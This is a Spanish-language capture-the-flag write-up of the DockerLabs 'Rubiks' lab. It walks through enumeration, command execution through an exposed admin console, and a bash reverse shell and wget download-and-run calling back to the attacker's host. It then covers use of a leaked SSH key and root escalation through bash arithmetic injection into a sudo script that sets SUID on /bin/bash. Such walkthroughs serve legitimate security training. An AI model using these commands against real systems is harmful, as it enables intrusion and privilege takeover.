---
title: DockerLabs - Rubiks
summary: "Write-up del laboratorio Rubiks de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:52:15
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_rubiks"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ nmap -sCV -p22,80 172.17.0.2                  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:3f:77:f8:5e:4e:89:42:4a:ce:14:3b:ac:59:05:74 (ECDSA)
|_  256 b4:2a:b2:f8:4a:1b:50:09:fb:17:28:b7:29:e6:9e:6d (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://rubikcube.dl/
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## análisis

Comenzamos revisando el servidor web de la máquina, y vemos que nos redirige al subdominio `rubikcube.dl`:

![Desktop View](/20260113154516.webp){: width="972" height="589" .shadow}

Para que nos resuelva correctamente este dominio, lo debemos agregar en el fichero `/etc/hosts` de nuestra máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ cat /etc/hosts | grep rubik
172.17.0.2      rubikcube.dl
```

Si ahora recargamos la página, veremos que nos cargan correctamente los recursos:

![Desktop View](/20260113154751.webp){: width="972" height="589" .shadow}

Mientras revisamos la página web, dejaremos corriendo **gobuster** en segundo plano buscando recursos disponibles en el servidor web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ gobuster dir -u "http://rubikcube.dl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rubikcube.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/faq.php              (Status: 200) [Size: 7817]
/about.php            (Status: 200) [Size: 4181]
/img                  (Status: 301) [Size: 310] [--> http://rubikcube.dl/img/]
/administration       (Status: 301) [Size: 321] [--> http://rubikcube.dl/administration/]
/index.php            (Status: 200) [Size: 4327]
/server-status        (Status: 403) [Size: 277]

===============================================================
Finished
===============================================================
```

Encontramos un panel de administrador en `/administration`, el cual vemos que no está protegido tras un panel de autenticación:

![Desktop View](/20260114003115.webp){: width="972" height="589" .shadow}

Vemos que en el apartado `Configuraciones` la mayoría de las funcionalidades no están habilitadas.

Una de las que destacan es `Consola`, la cual podemos intuir que nos permitiría ejecutar comandos si fuera posible acceder:

![Desktop View](/20260114004551.webp){: width="972" height="589" .shadow}

Sin embargo, vemos que no encuentra el script `myconsole.php`:

![Desktop View](/20260114004720.webp){: width="972" height="589" .shadow}

Ya que no podemos hacer mucho con respecto a esta funcionalidad, seguiremos investigando la máquina.

Dado que estamos tratando con dominios, trataremos de obtener un listado de subdominios del dominio `rubikcube.dl` empleando **gobuster**, donde vemos que el subdominio `administration.rubikcube.dl` es válido:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ gobuster vhost -u 'http://rubikcube.dl' -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r --ad                
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://rubikcube.dl
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
administration.rubikcube.dl Status: 200 [Size: 5460]
```

Para que nos lo pueda resolver correctamente, lo agregamos también al fichero `/etc/hosts` de nuestra máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ cat /etc/hosts | grep rubik 
172.17.0.2      rubikcube.dl administration.rubikcube.dl
```

Al acceder, vemos lo mismo que accediendo por el recurso `/administration` del dominio `rubikcube.dl`:

![Desktop View](/20260114003946.webp){: width="972" height="589" .shadow}

Si ahora volvemos a tratar de acceder a la funcionalidad `Consola`, vemos que ahora sí que es posible acceder:

![Desktop View](/20260114004205.webp){: width="972" height="589" .shadow}

## acceso inicial (www-data)

Revisamos el código fuente de la página para ver pistas acerca de en que formato debe ir codificado el comando, pero no nos indican nada:

![Desktop View](/20260114005613.webp){: width="972" height="589" .shadow}

Vamos probando a codificar el comando en diferentes formatos (para facilitar el proceso de codificación, he usado la herramienta [CyberChef.io](https://cyberchef.io)), hasta que probamos con el formato **Base32**:

![Desktop View](/20260114010326.webp){: width="972" height="589" .shadow}

Vemos que cuando enviamos un comando codificado en Base32 nos devuelve el resultado de dicho comando:

![Desktop View](/20260114010355.webp){: width="972" height="589" .shadow}

En este punto ya habremos obtenido ejecución remota de comandos (**RCE**), y podemos obtener una consola remota en la máquina.

Lo primero será ponernos en escucha con **nc**, y luego ejecutar un comando que nos entablará la consola (codificado en Base32):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" | base32 -w0
MJQXG2BAFVRSAJ3CMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRG4ZC4MJXFYYC4MJPGQ2DINBAGA7CMMJHBI======
```

Sin embargo vemos que no nos devuelve la consola cuando lo ejecutamos en la web.

Probamos con diferentes comandos para entablarnos una reverse shell, pero con ninguno tenemos éxito.

Una forma alternativa de obtener acceso a la máquina es **subiendo un script a la máquina, y ejecutándolo para que nos entable la conexión**.

Lo que haremos en este caso será crear el script en nuestra máquina y abrir un servidor para descargar el script desde la máquina víctima:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" > rce.sh 

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

El comando para descargar el script en la máquina es el siguiente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ echo "wget http://172.17.0.1/rce.sh -O /tmp/rce.sh" | base32 -w0
O5TWK5BANB2HI4B2F4XTCNZSFYYTOLRQFYYS64TDMUXHG2BAFVHSAL3UNVYC64TDMUXHG2AK
```

Tras ejecutarlo, comprobaremos que se ha subido correctamente el script:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ echo "ls -la /tmp" | base32                                       
NRZSALLMMEQC65DNOAFA====
```

![Desktop View](/20260114015454.webp){: width="972" height="589" .shadow}

Para poder ejecutarlo, debemos darle permisos de ejecución antes, que lo haremos con el siguiente comando:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ echo "chmod +x /tmp/rce.sh" | base32
MNUG233EEAVXQIBPORWXAL3SMNSS443IBI======
```

![Desktop View](/20260114015755.webp){: width="972" height="589" .shadow}

Ahora ejecutamos el script con el siguiente comando:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ echo "bash /tmp/rce.sh" | base32 
MJQXG2BAF52G24BPOJRWKLTTNAFA====
```

En este punto, ya habremos conseguido la reverse shell por donde nos pusimos en escucha con **nc**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ nc -nlvp 4444               
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 41590
www-data@9317fb5cb35b:/var/www/html/administration$ whoami
whoami
www-data
www-data@9317fb5cb35b:/var/www/html/administration$ hostname -I
hostname -I
172.17.0.2
```

Para operar con más facilidad, procedemos a tratar la TTY:

```bash
www-data@9317fb5cb35b:/var/www/html/administration$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@9317fb5cb35b:/var/www/html/administration$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ stty raw -echo;fg           
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@9317fb5cb35b:/var/www/html/administration$ export TERM=xterm
www-data@9317fb5cb35b:/var/www/html/administration$ export SHELL=bash
www-data@9317fb5cb35b:/var/www/html/administration$ stty rows 37 columns 210
```

Listaremos los usuarios del sistema que tengan asignada una consola en el fichero `/etc/passwd`:

```bash
www-data@9317fb5cb35b:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
luisillo:x:1001:1001::/home/luisillo:/bin/sh
```

## movimiento lateral (luisillo)

Uno de los ficheros que destacan del directorio `/var/www/html/administration` es `.id_rsa`, que al ir a revisarlo, vemos que es la clave privada para acceder por SSH:

```bash
www-data@9317fb5cb35b:/var/www/html/administration$ ls -la
total 40
drwxr-xr-x 1 root root 4096 Aug 30  2024 .
drwxr-xr-x 1 root root 4096 Aug 30  2024 ..
-rwxr-xr-x 1 root root 3389 Aug 30  2024 .id_rsa
-rw-r--r-- 1 root root 6665 Aug 30  2024 configuration.php
drwxr-xr-x 2 root root 4096 Aug 30  2024 img
-rw-r--r-- 1 root root 5460 Aug 30  2024 index.php
-rw-r--r-- 1 root root 3509 Aug 30  2024 myconsole.php
-rw-r--r-- 1 root root 1825 Aug 30  2024 styles.css
www-data@9317fb5cb35b:/var/www/html/administration$ cat .id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
...
MixSXDn8CnuxAAAAFHR1X2VtYWlsQGV4YW1wbGUuY29tAQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```

Revisamos a ver si pertenece a alguno de los usuarios que hemos visto en el fichero `/etc/passwd`, y vemos que pertenece al usuario `luisillo`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Rubiks]
└─$ ssh -i id_rsa luisillo@172.17.0.2
$ whoami
luisillo
$ hostname -I
172.17.0.2
```

## escalada de privilegios (root)

En los permisos SUDO del usuario `luisillo` vemos que puede ejecutar el binario `/bin/cube` como el usuario `root`:

```bash
luisillo@9317fb5cb35b:~$ sudo -l
Matching Defaults entries for luisillo on 9317fb5cb35b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 9317fb5cb35b:
    (ALL) NOPASSWD: /bin/cube
```

Comprobamos que permisos tiene el fichero que se menciona, donde vemos que efectivamente tenemos permisos para ejecutarlo:

```bash
luisillo@9317fb5cb35b:~$ ls -la /bin/cube
-rwxr-xr-x 1 root root 722 Aug 30  2024 /bin/cube
```

Si lo ejecutamos, vemos que nos pide un número:

```bash
luisillo@9317fb5cb35b:~$ /bin/cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: 1

[!] Incorrecto

 La verificación ha sido completada.
```

Si tratamos de leer las instrucciones, vemos no se trata de un binario, sino de un script en Bash:

```bash
luisillo@9317fb5cb35b:~$ cat /bin/cube
#!/bin/bash

# Inicio del script de verificación de número
echo -n "Checker de Seguridad "

# Solicitar al usuario que ingrese un número
echo "Por favor, introduzca un número para verificar:"

# Leer la entrada del usuario y almacenar en una variable
read -rp "Digite el número: " num

# Función para comprobar el número ingresado
echo -e "\n"
check_number() {
  local number=$1
  local correct_number=***

  # Verificación del número ingresado
  if [[ $number -eq $correct_number ]]; then
    echo -e "\n[+] Correcto"
  else
    echo -e "\n[!] Incorrecto"
  fi
}

# Llamada a la función para verificar el número
check_number "$num"

# Mensaje de fin de script
echo -e "\n La verificación ha sido completada."
```

Si ahora volvemos a ejecutarlo e introducimos el código correcto, vemos que nos devuelve otro mensaje:

```bash
luisillo@9317fb5cb35b:~$ /bin/cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: ***

[+] Correcto

 La verificación ha sido completada.
```

Podemos provecharnos de la comparación que se está haciendo en el script con un payload como el siguiente:

```bash
a[0$(whoami)]
```

Este payload tiene las siguientes partes:
- `a[...]`: Declaramos un array.
- `$(comando)`: Ejecución de comandos aislada.
- `0$()`: Concatenamos un carácter para que el resultado del comando se muestre por pantalla junto con el error (se podría hacer de la siguiente forma también: `a[$(whoami >&2)]`).

Habiendo comprendido la estructura que estamos empleando para el payload, tras ejecutarlo veremos el resultado del comando ejecutado en el error del script:

```bash
luisillo@9317fb5cb35b:~$ sudo /bin/cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: a[0$(whoami)]

/bin/cube: line 19: 0root: value too great for base (error token is "0root")

La verificación ha sido completada.
```

Habiendo la conseguido inyección de comandos, optaremos en esta ocasión por escalar privilegios cambiando los permisos **SUID** (permite ejecutar el binario como el propietario) del binario `/bin/bash` para poder ejecutarlo como el propietario (que es `root`).

Comprobamos de primeras que el binario `/bin/bash` no sea SUID:

```bash
luisillo@9317fb5cb35b:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Procedemos a ejecutar el comando que modificará los permisos:

```bash
luisillo@9317fb5cb35b:~$ sudo /bin/cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: a[0$(chmod u+s /bin/bash)]

[!] Incorrecto

La verificación ha sido completada.
```

Si volvemos a revisar los permisos del binario `/bin/bash` , veremos que ahora sí es SUID:

```bash
luisillo@9317fb5cb35b:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ahora ya podemos invocar una consola privilegiada:

```bash
luisillo@9317fb5cb35b:~$ bash -p
bash-5.2# whoami
root
```

Y de esta manera acaba la resolución de la máquina `Rubiks`!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>